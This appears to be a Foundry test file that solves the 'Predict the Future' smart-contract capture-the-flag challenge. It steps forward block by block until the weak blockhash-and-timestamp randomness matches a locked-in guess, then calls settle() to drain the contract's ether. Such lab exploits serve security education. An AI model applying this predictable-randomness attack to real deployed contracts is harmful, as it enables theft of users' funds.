// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {PredictTheFutureChallenge} from "../../src/predict/PredictTheFutureChallenge.sol";

contract PredictTheFutureChallengeTest is Test {

    PredictTheFutureChallenge predictContract;
    address attacker = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);

    function setUp() public {
        predictContract = new PredictTheFutureChallenge{value: 1 ether}();
        assertEq(address(predictContract).balance, 1 ether);
    }

    function testPredictAttack(uint8 _palpite) public {
        vm.assume(_palpite >= 0 && _palpite <= 9);

        vm.deal(attacker, 1 ether);
        vm.roll(1);
        vm.prank(attacker);
        assertEq(address(attacker).balance, 1 ether);
        predictContract.lockInGuess{value: 1 ether}(_palpite);
        
        // after guess
        assertEq(address(attacker).balance, 0 ether);
        assertEq(address(predictContract).balance, 2 ether);

        uint answer = 99;
        uint myBlockNumber = vm.getBlockNumber() + 1;

        while (_palpite != answer) {
            myBlockNumber = myBlockNumber + 1;
            
            vm.roll(myBlockNumber);

            answer = uint8(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            blockhash(vm.getBlockNumber() - 1),
                            block.timestamp
                        )
                    )
                )
            ) % 10;
        }

        console.log("Attack on block: ", myBlockNumber);
    
        vm.prank(attacker);
        predictContract.settle();

        // after attack
        assertEq(address(attacker).balance, 2 ether);
        assertEq(address(predictContract).balance, 0 ether);
    }
}